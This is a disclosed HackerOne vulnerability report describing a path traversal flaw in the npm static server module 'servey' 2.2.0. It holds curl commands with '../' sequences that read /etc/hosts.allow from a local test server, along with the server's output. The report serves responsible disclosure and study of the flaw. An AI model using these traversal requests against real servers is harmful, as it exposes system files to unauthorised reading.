---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '355501'
original_report_id: '355501'
title: '[servey] Path Traversal allows to retrieve content of any file with extension
  from remote server'
weakness: Path Traversal
team_handle: nodejs-ecosystem
created_at: '2018-05-21T13:15:10.580Z'
disclosed_at: '2019-04-03T20:08:41.745Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 1
asset_identifier: servey
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- path-traversal
---

# [servey] Path Traversal allows to retrieve content of any file with extension from remote server

## Metadata

- HackerOne Report ID: 355501
- Weakness: Path Traversal
- Program: nodejs-ecosystem
- Disclosed At: 2019-04-03T20:08:41.745Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi Team,

I would like to report a partial Path Traversal in ```servey``` module.
It allows to read content of any arbitrary file (with extension) from the server.

## Module

**module name:** servey
**version:** 2.2.0
**npm page:** https://www.npmjs.com/package/servey

### Module Description

A static & single page application server.

### Module Stats

~120-200 downloads/month (estimated)

## Vulnerability Description



## Steps To Reproduce:

- Install ```servey``` module:

```
$ npm install servey
```

- create sample application following an example from module's npm doc:

```javascript
// app.js
const Servey = require('servey');
const Path = require('path') 
const server = Servey.create({
    spa: true,
    port: 8080,
    folder: Path.join(__dirname, 'static')
});

server.on('error', function (error) {
    console.error(error);
});

server.on('request', function (req) {
    console.log(req.url);
});

server.on('open', function () {
    console.log('open');
});

server.open();
```

- run app:

```
$ node app.js 
open

```


- try to retrieve content of ```/etc/passwd``` (an example file without any extension). ```servey``` does not allow to open such file and throws HTTP 500 Internal Server Error:

```
$ curl -v --path-as-is localhost:8080/../../../../../../etc/passwd
*   Trying ::1...
* connect to ::1 port 8080 failed: Connection refused
*   Trying 127.0.0.1...
* Connected to localhost (127.0.0.1) port 8080 (#0)
> GET /../../../../../../etc/passwd HTTP/1.1
> Host: localhost:8080
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 500 Internal Server Error
< Content-Type: text/html; charset=utf8
< Date: Mon, 21 May 2018 13:08:15 GMT
< Connection: keep-alive
< Transfer-Encoding: chunked
< 
* Connection #0 to host localhost left intact
{"code":500,"message":"Internal Server Error"}

```

- verify logs that request failed:

```
$ node app.js 
open
/../../../../../../etc/passwd
{ Error: ENOENT: no such file or directory, open '/home/rafal.janicki/playground/hackerone/node/static/index.html'
  errno: -2,
  code: 'ENOENT',
  syscall: 'open',
  path: '/home/rafal.janicki/playground/hackerone/node/static/index.html' }
```


- now, try to execute following curl command to retrieve content of ```/etc/hosts.allow``` (adjust amount of ../ to reflect your system):

```
$ curl -v --path-as-is localhost:8080/../../../../../../etc/hosts.allow
*   Trying ::1...
* connect to ::1 port 8080 failed: Connection refused
*   Trying 127.0.0.1...
* Connected to localhost (127.0.0.1) port 8080 (#0)
> GET /../../../../../../etc/hosts.allow HTTP/1.1
> Host: localhost:8080
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Content-Type: undefined; charset=utf8
< Date: Mon, 21 May 2018 13:06:38 GMT
< Connection: keep-alive
< Transfer-Encoding: chunked
< 
# /etc/hosts.allow: list of hosts that are allowed to access the system.
#                   See the manual pages hosts_access(5) and hosts_options(5).
#
# Example:    ALL: LOCAL @some_netgroup
#             ALL: .foobar.edu EXCEPT terminalserver.foobar.edu
#
# If you're going to protect the portmapper use the name "rpcbind" for the
# daemon name. See rpcbind(8) and rpc.mountd(8) for further information.
#

* Connection #0 to host localhost left intact

```

- check ```servey``` app logs again:

```
$ node app.js 
open
/../../../../../../etc/passwd
{ Error: ENOENT: no such file or directory, open '/home/rafal.janicki/playground/hackerone/node/static/index.html'
  errno: -2,
  code: 'ENOENT',
  syscall: 'open',
  path: '/home/rafal.janicki/playground/hackerone/node/static/index.html' }
/../../../../../../etc/hosts.allow

```

You can see ```hosts.allow``` requets did not fail and the content of the file was retrieved.


## Patch

N/A

## Supporting Material/References:

- Operating system: Ubuntu 16.04
- Node.js 8.11.1
- npm v. 6.0.1
- curl 7.47.0

## Wrap up

- I contacted the maintainer to let him know: [N] 
- I opened an issue in the related repository: [N] 


Regards,

Rafal 'bl4de' Janicki

## Impact

An attacker is able to retrieve content of any file with extension from remote server.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
